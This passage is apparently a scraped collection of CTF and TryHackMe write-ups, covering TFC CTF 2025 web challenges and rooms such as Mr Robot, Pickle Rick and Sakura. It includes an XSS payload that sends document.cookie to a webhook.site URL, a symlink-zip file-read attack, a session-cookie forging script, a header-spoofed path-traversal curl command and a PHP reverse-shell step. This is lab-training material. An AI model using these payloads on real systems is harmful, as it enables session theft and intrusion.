chromium-driver \\\n    libatk1.0-0 \\\n    libatk-bridge2.0-0 \\\n    libcups2 \\\n    libdbus-1-3 \\\n    libdrm2 \\\n    libgbm1 \\\n    libgtk-3-0 \\\n    libnspr4 \\\n    libnss3 \\\n    libx11-xcb1 \\\n    libxcomposite1 \\\n    libxdamage1 \\\n    libxrandr2 \\\n    xdg-utils \\\n &amp;&amp; rm -rf /var/lib/apt/lists/*\n\n# so selenium can call \"google-chrome\" by default\nRUN ln -s /usr/bin/chromium /usr/bin/google-chrome\n\nRUN useradd -m -d /app -s /bin/bash sadge \\\n    &amp;&amp; chown -R sadge:sadge /app\nUSER sadge\n\nWORKDIR /app\nCOPY . /app\n\n# install Python deps\nRUN pip install --no-cache-dir -r requirements.txt\n\nEXPOSE 8000\n\n# tell Selenium where to find Chromium if needed:\nENV CHROME_BINARY=/usr/bin/chromium\n\nCMD [\"python\", \"main.py\"]\n</code></pre> <p><code>start_docker.sh</code>:</p> <pre><code>#!/bin/bash\n\ndocker build -t icseses .\ndocker run -it --rm \\\n    -p 8000:8000 \\\n    icseses\n</code></pre> <p><code>requirements.txt</code>:</p> <pre><code>Mako==1.2.4\nselenium==4.32.0\n</code></pre> <p><code>main.py</code>:</p> <pre><code>from http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nfrom urllib.parse import parse_qs\nfrom bot import visit_url\nfrom mako.template import Template\nfrom mako.lookup import TemplateLookup\nimport os\nfrom urllib.parse import urlparse, parse_qs\nfrom threading import Thread\n\nMODULE_DIR = os.path.join(os.path.dirname(__file__), 'templates')\nif not os.path.exists(MODULE_DIR):\n    try:\n        os.makedirs(MODULE_DIR)\n    except OSError as e:\n        print(f\"Warning: Could not create Mako module directory: {e}\")\n        MODULE_DIR = None\n\nhtml_template = \"\"\"\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Pixel Rainbow Name&lt;/title&gt;\n    &lt;style&gt;\n        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&amp;display=swap');\n\n        body {\n            font-family: 'Press Start 2P', cursive;\n            background-color: #222;\n            color: #fff;\n            display: flex;\n            flex-direction: column;\n            align-items: center;\n            justify-content: center;\n            min-height: 100vh;\n            margin: 0;\n            padding: 20px;\n            box-sizing: border-box;\n        }\n\n        .container {\n            background-color: #333;\n            padding: 30px;\n            border: 5px solid #555;\n            box-shadow: 0 0 0 5px #444, 0 0 0 10px #333, 0 0 20px 10px #000;\n            text-align: center;\n        }\n\n        h1 {\n            font-size: 24px;\n            color: #0f0; /* Green for a retro feel */\n            margin-bottom: 20px;\n            text-shadow: 2px 2px #000;\n        }\n\n        label {\n            font-size: 16px;\n            color: #ccc;\n            display: block;\n            margin-bottom: 10px;\n        }\n\n        input[type=\"text\"] {\n            font-family: 'Press Start 2P', cursive;\n            padding: 10px;\n            font-size: 16px;\n            border: 3px solid #555;\n            background-color: #444;\n            color: #fff;\n            margin-bottom: 20px;\n            outline: none;\n        }\n\n        input[type=\"submit\"] {\n            font-family: 'Press Start 2P', cursive;\n            padding: 10px 20px;\n            font-size: 16px;\n            color: #fff;\n            background-color: #007bff;\n            border: 3px solid #0056b3;\n            cursor: pointer;\n            transition: background-color 0.2s;\n        }\n\n        input[type=\"submit\"]:hover {\n            background-color: #0056b3;\n        }\n\n        .name-display {\n            margin-top: 30px;\n            font-size: 32px; /* Base size for rainbow text */\n            font-weight: bold;\n            padding: 10px;\n        }\n\n        .rainbow-text {\n            /* Fallback for browsers that don't support background-clip */\n            color: #fff;\n            /* Rainbow effect */\n            background: linear-gradient(to right,\n                hsl(0, 100%, 50%),  /* Red */\n                hsl(30, 100%, 50%), /* Orange */\n                hsl(60, 100%, 50%), /* Yellow */\n                hsl(120, 100%, 50%),/* Green */\n                hsl(180, 100%, 50%),/* Cyan */\n                hsl(240, 100%, 50%),/* Blue */\n                hsl(300, 100%, 50%) /* Magenta */\n            );\n            -webkit-background-clip: text;\n            background-clip: text;\n            color: transparent; /* Make the text itself transparent */\n            /* Animate the gradient */\n            animation: rainbow_animation 6s ease-in-out infinite;\n            background-size: 400% 100%;\n            text-shadow: none; /* Remove any inherited text-shadow */\n        }\n\n        .rainbow-text span { /* Ensure individual spans also get the effect if we were to wrap letters */\n             -webkit-background-clip: text;\n            background-clip: text;\n            color: transparent;\n        }\n\n        @keyframes rainbow_animation {\n            0%, 100% {\n                background-position: 0 0;\n            }\n            50% {\n                background-position: 100% 0;\n            }\n        }\n\n        .instructions {\n            font-size: 12px;\n            color: #888;\n            margin-top: 30px;\n        }\n\n    &lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;div class=\"container\"&gt;\n        &lt;h1&gt;Pixel Name Display!&lt;/h1&gt;\n        &lt;form method=\"GET\" action=\"/\"&gt;\n            &lt;label for=\"name\"&gt;Enter Your Name:&lt;/label&gt;\n            &lt;input type=\"text\" id=\"name\" name=\"name_input\" autofocus&gt;\n            &lt;input type=\"submit\" value=\"Show Fancy Name\"&gt;\n        &lt;/form&gt;\n\n        % if name_to_display:\n            &lt;div class=\"name-display\"&gt;\n                Your fancy name is:\n                &lt;div class=\"rainbow-text\"&gt;NAME&lt;/div&gt;\n            &lt;/div&gt;\n        % endif\n\n        &lt;p class=\"instructions\"&gt;\n            Enter a name and see it in glorious pixelated rainbow colors!\n        &lt;/p&gt;\n        &lt;p class=\"instructions\"&gt;\n            Escaped characters: ${banned}\n        &lt;/p&gt;\n        &lt;input type=\"submit\" value=\"Report Name\" onclick=\"reportName()\"&gt;\n        &lt;script&gt;\n            function reportName() {\n                // Get from query string\n                const name = new URLSearchParams(window.location.search).get('name_input');\n                if (name) {\n                    fetch('/report', {\n                        method: 'POST',\n                        headers: {\n                            'Content-Type': 'application/json'\n                        },\n                        body: JSON.stringify({ name: name })\n                    })\n                    .then(response =&gt; {\n                        if (response.ok) {\n                            alert('Name reported successfully!');\n                        } else {\n                            alert('Failed to report name.');\n                        }\n                    })\n                    .catch(error =&gt; {\n                        console.error('Error reporting name:', error);\n                    });\n                }\n            }\n        &lt;/script&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\"\"\"\n\nlookup = TemplateLookup(directories=[os.path.dirname(__file__)], module_directory=MODULE_DIR)\n\nbanned = [\"s\", \"l\", \"(\", \")\", \"self\", \"_\", \".\", \"\\\"\", \"\\\\\", \"import\", \"eval\", \"exec\", \"os\", \";\", \",\", \"|\"]\n\n\ndef escape_html(text):\n    \"\"\"Escapes HTML special characters in the given text.\"\"\"\n    return text.replace(\"&amp;\", \"&amp;amp;\").replace(\"&lt;\", \"&amp;lt;\").replace(\"&gt;\", \"&amp;gt;\").replace(\"(\", \"&amp;#40;\").replace(\")\", \"&amp;#41;\")\n\ndef render_page(name_to_display=None):\n    \"\"\"Renders the HTML page with the given name.\"\"\"\n    templ = html_template.replace(\"NAME\", escape_html(name_to_display or \"\"))\n    template = Template(templ, lookup=lookup)\n    return template.render(name_to_display=name_to_display, banned=\"&amp;&lt;&gt;()\")\n\nclass SimpleHTTPRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n\n        # Parse the path and extract query parameters\n        parsed_url = urlparse(self.path)\n        params = parse_qs(parsed_url.query)\n        name = params.get(\"name_input\", [\"\"])[0]\n\n        for b in banned:\n            if b in name:\n                name = \"Banned characters detected!\"\n                print(b)\n\n        # Render and return the page\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(render_page(name_to_display=name).encode(\"utf-8\"))\n\n    def do_POST(self):\n        # Handle POST requests to report names\n        if self.path == \"/report\":\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            name = json.loads(post_data.decode('utf-8')).get(\"name\", \"\")\n            print(f\"Received name: {name}\")\n            if name:\n                print(f\"Reported name: {name}\")\n                self.send_response(200)\n                self.end_headers()\n                self.wfile.write(b\"Name reported successfully!\")\n                Thread(target=visit_url, args=(name,)).start()\n            else:\n                self.send_response(400)\n                self.end_headers()\n                self.wfile.write(b\"Bad Request: No name provided.\")\n        else:\n            self.send_response(404)\n            self.end_headers()\n\ndef run_server(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=8000):\n    server_address = (\"0.0.0.0\", port)\n    httpd = server_class(server_address, handler_class)\n    print(f\"Starting http server on port {port}...\")\n    print(f\"Access the page at http://0.0.0.0:{port}\")\n    try:\n        httpd.serve_forever()\n    except KeyboardInterrupt:\n        print(\"\\nServer stopped.\")\n    finally:\n        httpd.server_close()\n\nif __name__ == \"__main__\":\n    run_server()\n</code></pre> <p><code>bot.py</code>:</p> <pre><code>import tempfile\nimport time\nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.options import Options\nimport sys\nfrom urllib.parse import quote\n\nURL_BASE = \"http://localhost:8000\"\n\ndef visit_url(name: str, timeout: int = 30):\n  chrome_opts = Options()\n  chrome_opts.add_argument(\"--headless=new\")\n  chrome_opts.add_argument(\"--disable-gpu\")\n  chrome_opts.add_argument(\"--disable-dev-shm-usage\")\n  chrome_opts.add_argument(\"--disable-extensions\")\n  chrome_opts.add_argument(\"--disable-popup-blocking\")\n  chrome_opts.add_argument(\"--blink-settings=imagesEnabled=false\")  # don't load images\n  chrome_opts.add_argument(\"--log-level=3\")  # reduce logging\n  chrome_opts.add_argument(\"--no-sandbox\")\n\n  user_data_dir = tempfile.mkdtemp(prefix=\"chrome-profile-\")\n  chrome_opts.add_argument(f\"--user-data-dir={user_data_dir}\")  # use a temporary user data directory\n\n\n  chrome_opts.add_argument(\"--user-data-dir=/tmp/chrome\")  # use a temporary user data directory\n\n  driver = webdriver.Chrome(options=chrome_opts)\n\n  try:\n    driver.set_page_load_timeout(timeout)\n    driver.set_script_timeout(5)\n    driver.get(URL_BASE)\n    driver.add_cookie({\n        \"name\": \"flag\",\n        \"value\": \"TFCCTF{~}\",\n    })\n\n    encoded_name = quote(name)\n    driver.get(f\"{URL_BASE}/?name_input={encoded_name}\")\n    # allow some time for JS to execute\n    time.sleep(200)\n    driver.quit()\n  finally:\n    driver.quit()\n</code></pre>"},{"location":"TFC%20CTF%202025/Web/KISSFIXESS/#solution","title":"Solution","text":"<p>The goal is to steal the flag cookie from the bot. This can be done by XSS: payload in the <code>name</code> input and clicking \"Report Name\" button to make the bot visit it.</p> <p>But there are some banned strings:</p> <pre><code>banned = [\"s\", \"l\", \"(\", \")\", \"self\", \"_\", \".\", \"\\\"\", \"\\\\\", \"import\", \"eval\", \"exec\", \"os\", \";\", \",\", \"|\"]\n</code></pre> <p>Presence of \"import\" \"eval\" etc in the above hints towards Server Side Template Injection. We can see that <code>Mako</code> template engine is being used. Trying SSTI:</p> <p></p> <p>A <code>banned</code> string is being passed, can we use it?</p> <pre><code>return template.render(name_to_display=name_to_display, banned=\"&amp;&lt;&gt;()\")\n</code></pre> <p></p> <p>Yep! Now we have a way to inject <code>&amp; &lt; &gt; ( )</code></p> <p>As for other characters (if used inside strings), we can use HTML Codes (e.g. code for <code>\"</code> is <code>&amp;#34;</code>):</p> <p></p> <p>Crafting the payload (using Webhook to get a url to send cookie to):</p> <pre><code>&lt;img src=x onerror='fetch(\"https://webhook.site/c18ed5ff-57ec-4e82-87ba-7fb48728299a/?item=\"+document.cookie)'&gt;\n\n${banned[1]}img SRC=x onerror='fetch${banned[3]}\"https://webhook.site/c18ed5ff-57ec-4e82-87ba-7fb48728299a/?item=\"+document.cookie${banned[4]}'${banned[2]}\n\n${banned[1]}img SRC=x onerror='fetch${banned[3]}${banned[0]}#34http${banned[0]}#115://webhook${banned[0]}#46${banned[0]}#115ite/c18ed5ff-57ec-4e82-87ba-7fb48728299a/?item=${banned[0]}#34+document${banned[0]}#46cookie${banned[4]}'${banned[2]}\n</code></pre> <p>This payload works when \"Show Fancy Name\" is clicked, but doesn't when \"Report Name\" is clicked. In the bot code:</p> <pre><code>chrome_opts.add_argument(\"--blink-settings=imagesEnabled=false\")  # don't load images\n</code></pre> <p>Hence, <code>img</code> tag won't work. Using <code>video</code> tag:</p> <pre><code>${banned[1]}video SRC=x onerror='fetch${banned[3]}${banned[0]}#34http${banned[0]}#115://webhook${banned[0]}#46${banned[0]}#115ite/c18ed5ff-57ec-4e82-87ba-7fb48728299a/?item=${banned[0]}#34+document${banned[0]}#46cookie${banned[4]}'${banned[2]}\n</code></pre> <p>This payload works and we get the flag on Webhook within few secs of clicking the report button</p>"},{"location":"TFC%20CTF%202025/Web/SLIPPY/","title":"SLIPPY","text":"<pre><code>Slipping Jimmy keeps playing with Finger.\n</code></pre> <p>points: <code>50</code></p> <p>solves: <code>168</code></p> <p>author: <code>Sagi</code></p>"},{"location":"TFC%20CTF%202025/Web/SLIPPY/#files-provided","title":"Files provided","text":"<pre><code>\u251c\u2500\u2500 Dockerfile\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 .env\n    \u251c\u2500\u2500 middleware\n    \u2502\u00a0\u00a0 \u251c\u2500\u2500 developmentOnly.js\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 session.js\n    \u251c\u2500\u2500 package.json\n    \u251c\u2500\u2500 package-lock.json\n    \u251c\u2500\u2500 public\n    \u251c\u2500\u2500 routes\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 index.js\n    \u251c\u2500\u2500 server.js\n    \u251c\u2500\u2500 uploads\n    \u2514\u2500\u2500 views\n        \u251c\u2500\u2500 files.ejs\n        \u251c\u2500\u2500 index.ejs\n        \u251c\u2500\u2500 styles.ejs\n        \u2514\u2500\u2500 upload.ejs\n</code></pre> <p><code>Dockerfile</code>:</p> <pre><code>FROM node:22-bookworm\n\nWORKDIR /app\n\nCOPY src/package*.json ./\nRUN npm install\n\nCOPY src/ .\n\nEXPOSE 3000\n\nRUN rand_dir=\"/$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)\"; mkdir \"$rand_dir\" &amp;&amp; echo \"TFCCTF{Fake_fLag}\" &gt; \"$rand_dir/flag.txt\" &amp;&amp; chmod -R +r \"$rand_dir\"\n\nCMD [\"npm\", \"start\"]\n</code></pre> <p><code>.env</code>:</p> <pre><code>SESSION_SECRET=&lt;REDACTED&gt;\n</code></pre> <p><code>server.js</code>:</p> <pre><code>const express = require('express');\nconst session = require('express-session');\nconst path = require('path');\nconst fs = require('fs');\nrequire('dotenv').config();\n\n\nconst app = express();\n\n// Middleware\napp.use(express.urlencoded({ extended: false }));\napp.use(express.static('public'));\n\n// Session\nconst store = new session.MemoryStore();\nconst sessionData = {\n    cookie: {\n      path: '/',\n      httpOnly: true,\n      maxAge: 1000 * 60 * 60 * 48 // 1 hour\n    },\n    userId: 'develop'\n};\nstore.set('&lt;REDACTED&gt;', sessionData, err =&gt; {\n    if (err) console.error('Failed to create develop session:', err);\n    else console.log('Development session created!');\n  });\n\napp.use(session({\n  secret: process.env.SESSION_SECRET,\n  resave: false,\n  saveUninitialized: false,\n  store: store\n}));\n\napp.set('view engine', 'ejs');\napp.set('views', path.join(__dirname, 'views'));\napp.set('trust proxy', true);\n\n// Ensure uploads dir exists\nconst uploadsDir = path.join(__dirname, 'uploads');\nif (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir);\n\n// Routes\nconst indexRoutes = require('./routes/index');\napp.use('/', indexRoutes);\n\napp.listen(3000, () =&gt; {\n  console.log('Server running at http://localhost:3000');\n});\n</code></pre> <p><code>index.js</code>:</p> <pre><code>const express = require('express');\nconst multer = require('multer');\nconst path = require('path');\nconst { execFile } = require('child_process');\nconst fs = require('fs');\nconst ensureSession = require('../middleware/session');\nconst developmentOnly = require('../middleware/developmentOnly');\n\nconst router = express.Router();\n\nrouter.use(ensureSession);\n\nconst upload = multer({ dest: '/tmp' });\n\nrouter.get('/', (req, res) =&gt; {\n  res.render('index', { sessionId: req.session.userId });\n});\n\nrouter.get('/upload', (req, res) =&gt; {\n  res.render('upload');\n});\n\nrouter.post('/upload', upload.single('zipfile'), (req, res) =&gt; {\n    const zipPath = req.file.path;\n    const userDir = path.join(__dirname, '../uploads', req.session.userId);\n\n    fs.mkdirSync(userDir, { recursive: true });\n\n    // Command: unzip temp/file.zip -d target_dir\n    execFile('unzip', [zipPath, '-d', userDir], (err, stdout, stderr) =&gt; {\n      fs.unlinkSync(zipPath); // Clean up temp file\n\n      if (err) {\n        console.error('Unzip failed:', stderr);\n        return res.status(500).send('Unzip error');\n      }\n\n      res.redirect('/files');\n    });\n  });\n\nrouter.get('/files', (req, res) =&gt; {\n  const userDir = path.join(__dirname, '../uploads', req.session.userId);\n  fs.readdir(userDir, (err, files) =&gt; {\n    if (err) return res.status(500).send('Error reading files');\n    res.render('files', { files });\n  });\n});\n\nrouter.get('/files/:filename', (req, res) =&gt; {\n    const userDir = path.join(__dirname, '../uploads', req.session.userId);\n    const requestedPath = path.normalize(req.params.filename);\n    const filePath = path.resolve(userDir, requestedPath);\n\n    // Prevent path traversal\n    if (!filePath.startsWith(path.resolve(userDir))) {\n      return res.status(400).send('Invalid file path');\n    }\n\n    if (fs.existsSync(filePath) &amp;&amp; fs.statSync(filePath).isFile()) {\n      res.download(filePath);\n    } else {\n      res.status(404).send('File not found');\n    }\n  });\n\nrouter.get('/debug/files', developmentOnly, (req, res) =&gt; {\n    const userDir = path.join(__dirname, '../uploads', req.query.session_id);\n    fs.readdir(userDir, (err, files) =&gt; {\n    if (err) return res.status(500).send('Error reading files');\n    res.render('files', { files });\n  });\n});\n\nmodule.exports = router;\n</code></pre> <p><code>session.js</code>:</p> <pre><code>const crypto = require('crypto');\nconst path = require('path');\nconst fs = require('fs');\n\nconst USER_ID_REGEX = /^[a-f0-9]{16}$/;\n\nfunction isValidUserId(id) {\n  return id === 'develop' || USER_ID_REGEX.test(id);\n}\n\nmodule.exports = function (req, res, next) {\n    if (!isValidUserId(req.session.userId)) {\n      req.session.userId = crypto.randomBytes(8).toString('hex');\n    }\n\n    const userDir = path.join(__dirname, '../uploads', req.session.userId);\n    fs.mkdirSync(userDir, { recursive: true });\n\n    next();\n  };\n</code></pre> <p><code>developmentOnly.js</code>:</p> <pre><code>module.exports = function (req, res, next) {\n    if (req.session.userId === 'develop' &amp;&amp; req.ip == '127.0.0.1') {\n      return next();\n    }\n    res.status(403).send('Forbidden: Development access only');\n  };\n</code></pre>"},{"location":"TFC%20CTF%202025/Web/SLIPPY/#solution","title":"Solution","text":"<p>From dockerfile, we can see that the flag is stored in a directory with a random name</p> <p>About the endpoints:</p> <ul> <li><code>/upload</code>: Used to upload a zip file, which is unzipped and the files are stored in <code>../upload/&lt;userId&gt;</code></li> <li><code>/files</code>: Shows the list of files in <code>../upload/&lt;userId&gt;</code></li> <li><code>/files:filename</code>: Downloads the file specified. Potential path traversal is not possible here</li> <li><code>/debug/files?session_id=&lt;dirname&gt;</code>: Shows the files in the <code>../upload/&lt;dirname&gt;</code> directory. Potential path traversal endpoint but is protected by <code>developmentOnly</code> middleware</li> </ul> <p><code>developmentOnly</code> middleware allows access only if:</p> <ol> <li><code>req.ip == '127.0.0.1'</code>: We can see <code>app.set('trust proxy', true);</code> in <code>server.js</code>, this means that the server will trust the X-Forwarded-* headers</li> <li><code>req.session.userId === 'develop'</code>: We must forge a cookie that would bypass this. For that, we need the redacted sessionId in <code>server.js</code> and the redected secret in <code>.env</code></li> </ol> <p>Craft a malicious zip file, containing symlinks to <code>.env</code>, <code>server.js</code></p> <pre><code>ln -s /app/.env envlink\nln -s /app/server.js serverlink\nzip --symlinks exploit.zip envlink serverlink\n</code></pre> <p>Uploading this zip file gives us the <code>.env</code> &amp; <code>server.js</code> at the server</p> <p></p> <p>store.set('amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E', sessionData, err =&gt; { \\ SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b</p> <p>Forge a cookie:</p> <pre><code>import hmac, hashlib, base64\n\nsecret = b\"3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b\"\nsid = \"amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E\"\n\nsig = hmac.new(secret, sid.encode(), hashlib.sha256).digest()\nsig_b64 = base64.b64encode(sig).decode().rstrip(\"=\")\n\ncookie = f\"s:{sid}.{sig_b64}\"\nprint(\"connect.sid=\" + cookie)\n</code></pre> <p>List the files/directories in the <code>/</code> directory</p> <pre><code>curl https://web-slippy-d07ebf9335bd26f7.challs.tfcctf.com/debug/files?session_id=../../../ \\\n-H \"Cookie: connect.sid=s:amwvsLiDgNHm2XXfoynBUNRA2iWoEH5E.R3H281arLqbqxxVlw9hWgdoQRZpcJElSLSSn6rdnloE\" \\\n-H \"X-Forwarded-For: 127.0.0.1\"\n</code></pre> <p>We find the flag directory:</p> <pre><code>&lt;li class=\"list-group-item\"&gt;\n    tlhedn6f\n    &lt;a href=\"/files/tlhedn6f\" class=\"button\"&gt;Download&lt;/a&gt;\n&lt;/li&gt;\n</code></pre> <p>Symlink attack again:</p> <pre><code>ln -s /tlhedn6f/flag.txt flaglink\nzip --symlinks flag.zip flaglink\n</code></pre> <p>Upload the zip and download the \"flaglink\" file -&gt; this gives the flag</p>"},{"location":"TryHackMe/Mr%20Robot/","title":"Mr Robot","text":""},{"location":"TryHackMe/Mr%20Robot/#key-1","title":"Key 1","text":"<p>Visit <code>/robots.txt</code>:</p> <pre><code>User-agent: *\nfsocity.dic\nkey-1-of-3.txt\n</code></pre> <p><code>/key-1-of-3.txt</code> -&gt; Got 1st key!</p>"},{"location":"TryHackMe/Mr%20Robot/#key-2","title":"Key 2","text":"<p>Hint: There's something fishy about this wordlist... Why is it so long?</p> <p>Download the wordlist, remove duplicates and run gobuster:</p> <pre><code>wget http://10.10.86.225/fsocity.dic\n</code></pre> <pre><code>wordlist_file = \"fsocity.dic\"\noutput_file = \"tmp.txt\"\n\nwith open(wordlist_file, 'r') as f:\n    unique_words = {line.strip() for line in f}\n\nwith open(output_file, 'w') as f:\n    for word in unique_words:\n        f.write(word + '\\n')\n</code></pre> <pre><code>gobuster dir -u http://10.10.86.225/ -w ctfs/tmp.txt\n</code></pre> <p></p> <p>At <code>/license</code>, we find a base64-encoded string</p> <pre><code>echo \"ZWxsaW90OkVSMjgtMDY1Mgo=\" | base64 -d\n&gt; elliot:ER28-0652\n</code></pre> <p><code>/login</code> directs us to a Wordpress login page</p> <p></p> <p>Entering the Username: elliot and Password: ER28-0652 logs us in!</p> <p>We can host a php reverse shell using theme editor:</p> <p></p> <p>Set up a listening server and visit the page (http://10.10.86.225/wp-includes/themes/TwentyFifteen/404.php)</p> <pre><code>nc -lvnp 7777\n</code></pre> <p></p> <p><code>password.raw-md5</code> gives us a md5 hashed password, which can be decoded by John the Ripper</p> <pre><code>john --format=raw-md5 --wordlist=rockyou.txt password.raw-md5\n</code></pre> <p></p>"},{"location":"TryHackMe/Mr%20Robot/#key-3","title":"Key 3","text":"<p>???</p>"},{"location":"TryHackMe/OhSINT/","title":"OhSINT","text":"<p>We are given an image (of Windows XP wallpaper) and have to answer the following:</p> <ol> <li>What is this user's avatar of?</li> <li>What city is this person in?</li> <li>What is the SSID of the WAP he connected to?</li> <li>What is his personal email address?</li> <li>What site did you find his email address on?</li> <li>Where has he gone on holiday?</li> <li>What is the person's password?</li> </ol> <pre><code>exiftool WindowsXP_1551719014755.jpg\n.\n.\nGPS Latitude                    : 54 deg 17' 41.27\" N\nGPS Longitude                   : 2 deg 15' 1.33\" W\nCopyright                       : OWoodflint\n.\n.\n</code></pre> <p>Entering these coordinates on https://www.gps-coordinates.net/ takes us to New York, which is Answer-6</p> <p>Google search results of \"OWoodflint\":</p> <p></p> <p>The github repo:</p> <p></p> <p>This gives us Answers-2,4,5</p> <p>The twitter profile:</p> <p></p> <p>This gives us Answer-1. Using geowifi or simply WiGLE, we get SSID \"UnileverWiFi\", which is Answer-3</p> <p>The wordpress blog:</p> <p></p> <p>This again gives us the Answer-6. And upon inspecting the HTML, we get the Answer-7</p> <p>The Answers:</p> <ol> <li>cat</li> <li>London</li> <li>UnileverWiFi</li> <li>OWoodflint@gmail.com</li> <li>Github</li> <li>New York</li> <li>pennYDr0pper.!</li> </ol>"},{"location":"TryHackMe/Pickle%20Rick/","title":"Pickle Rick","text":"<ol> <li>What is the first ingredient that Rick needs?</li> <li>What is the second ingredient in Rick\u2019s potion?</li> <li>What is the last and final ingredient?</li> </ol> <p>Inspecting the HTML of the landing page (<code>index.html</code>), we come across a comment:</p> <pre><code>Note to self, remember username!\n\n    Username: R1ckRul3s\n</code></pre> <p>Username... but there's no direct way to access a login page</p> <p>Let's try directory enumeration:</p> <pre><code>gobuster dir -u 10.10.241.41 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt\n</code></pre> <p></p> <pre><code>robots.txt\n&gt; Wubbalubbadubdub\n\nclue.txt\n&gt; Look around the file system for the other ingredient.\n</code></pre> <p>The <code>assets/</code> just contains a few images</p> <p><code>portal.php</code> and <code>login.php</code> both direct to the same login page; Username: R1ckRul3s and Password: Wubbalubbadubdub worked!</p> <p>Upon logging in, we get a command panel, a Shell!</p> <pre><code>ls\n</code></pre> <p></p> <pre><code>cat Sup3rS3cretPickl3Ingred.txt\n&gt; Command denied\nless Sup3rS3cretPickl3Ingred.txt\n&gt; mr. meeseek hair\n</code></pre> <p>Answer-1: mr. meeseek hair</p> <p>Now, let's try to search for all the text files in the system:</p> <pre><code>find / -type f -name \"*.txt\"\n&gt; lot of files, but nothing interesting\nsudo find / -type f -name \"*.txt\"\n&gt; an interesting file: /root/3rd.txt\nsudo less /root/3rd.txt\n&gt; 3rd ingredients: fleeb juice\n</code></pre> <p>Answer-3: fleeb juice</p> <p>Maybe we can try searching files with \"ingredient\" in name:</p> <pre><code>find / -iname \"ingredient\"\n&gt; /home/rick/second ingredients\nless \"/home/rick/second ingredients\"\n&gt; 1 jerry tear\n</code></pre> <p>Answer-2: 1 jerry tear</p>"},{"location":"TryHackMe/Sakura/","title":"Sakura","text":""},{"location":"TryHackMe/Sakura/#tip-off","title":"TIP-OFF","text":"<p>We are given a SVG, and we have to answer the question: What username does the attacker go by?</p> <pre><code>exiftool sakurapwnedletter.svg\n.\n.\nExport-filename                 : /home/SakuraSnowAngelAiko/Desktop/pwnedletter.png\n.\n.\n</code></pre> <p>Answer: SakuraSnowAngelAiko</p>"},{"location":"TryHackMe/Sakura/#reconnaisance","title":"RECONNAISANCE","text":"<ol> <li>What is the full email address used by the attacker?</li> <li>What is the attacker's full real name?</li> </ol> <p>Google search results of \"SakuraSnowAngelAiko\":</p> <p></p> <p>Scrolling through the twitter posts, we get:</p> <p></p> <p>Answer-2: Ako Abe</p> <p>The github profile:</p> <p></p> <p>In the PGP repo,there's a PGP public key. Base64-decoding it gives us the Answer-1: SakuraSnowAngel83@protonmail.com</p>"},{"location":"TryHackMe/Sakura/#unveil","title":"UNVEIL","text":"<ol> <li>What cryptocurrency does the attacker own a cryptocurrency wallet for?</li> <li>What is the attacker's cryptocurrency wallet address?</li> <li>What mining pool did the attacker receive payments from on January 23, 2021 UTC?</li> <li>What other cryptocurrency did the attacker exchange with using their cryptocurrency wallet?</li> </ol> <p>The latest commit in ETH repo:</p> <p></p> <p>Searching the given address takes us to https://etherscan.io/address/0xa102397dbeeBeFD8cD2F73A89122fCdB53abB6ef</p> <p>Hence, Answer-1: Ethereum and Answer-2: 0xa102397dbeeBeFD8cD2F73A89122fCdB53abB6ef</p> <p>Observing the transactions list on etherscan, we get the Answer-3: Ethermine and Answer-4: Tether</p>"},{"location":"TryHackMe/Sakura/#taunt","title":"TAUNT","text":"<ol> <li>What is the attacker's current Twitter handle?</li> <li>What is the BSSID for the attacker's Home WiFi?</li> </ol> <p>We already know Answer-1: SakuraLoverAiko</p> <p>A previous version of this challenge had an image as hint:</p> <p></p> <p>SSID is DK1F-G. Using geowifi, we get:</p> <pre><code>\u2503 Module         \u2503       BSSID       \u2503  SSID  \u2503  Latitude   \u2503  Longitude  \u2503\n\u2521\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2547\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2529\n\u2502 wigle          \u2502 84:AF:EC:34:FC:F8 \u2502 DK1F-G \u2502 40.60551453 \u2502 140.4606781 \u2502\n</code></pre> <p>Hence, Answer-2: 84:AF:EC:34:FC:F8</p>"},{"location":"TryHackMe/Sakura/#homebound","title":"HOMEBOUND","text":"<ol> <li>What airport is closest to the location the attacker shared a photo from prior to getting on their flight?</li> <li>What airport did the attacker have their last layover in?</li> <li>What lake can be seen in the map shared by the attacker as they were on their final flight home?</li> <li>What city does the attacker likely consider \"home\"?</li> </ol> <p>Zooming into the picture, Washingtom Moument can be seen. The nearest airport is Ronald Reagan Washington National Airport, which gives us the Answer-1: DCA</p> <p></p> <p>Jal First Class Lounge is located at Haneda Airport, which gives us the Answer-2: HND</p> <p></p> <p>Google Lens search gives us the Answer-3: Lake Inawashiro</p> <p>Entering the coordinates from geowifi output on https://www.gps-coordinates.net/, gives us the Answer-4: 